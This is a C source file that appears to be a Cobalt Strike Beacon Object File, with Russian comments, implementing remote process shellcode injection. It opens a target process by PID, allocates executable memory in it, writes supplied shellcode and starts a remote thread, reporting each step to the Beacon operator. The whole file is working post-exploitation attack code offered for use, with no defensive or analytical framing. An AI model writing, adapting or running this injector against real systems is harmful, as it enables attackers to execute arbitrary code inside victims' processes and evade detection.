#include <windows.h>
#include "beacon.h"

void go(char *args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    // 1. Извлекаем аргументы: PID и адрес буфера с шелл-кодом
    int pid = BeaconDataInt(&parser);
    int shellcode_len = 0;
    char* shellcode = BeaconDataExtract(&parser, &shellcode_len);

    if (!shellcode || pid == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Invalid arguments: PID=%d, Len=%d", pid, shellcode_len);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Attempting injection into PID: %d", pid);

    // 2. Открываем целевой процесс
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
    if (!hProcess) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to open process. Error: %d", GetLastError());
        return;
    }

    // 3. Выделяем память в удаленном процессе
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx failed.");
        CloseHandle(hProcess);
        return;
    }

    // 4. Записываем шелл-код
    SIZE_T written;
    if (!WriteProcessMemory(hProcess, remoteMem, shellcode, shellcode_len, &written)) {
        BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory failed.");
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // 5. Создаем удаленный поток
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hThread) {
        BeaconPrintf(CALLBACK_ERROR, "CreateRemoteThread failed.");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Injection successful! Thread ID: %d", GetThreadId(hThread));
        CloseHandle(hThread);
    }

    CloseHandle(hProcess);
}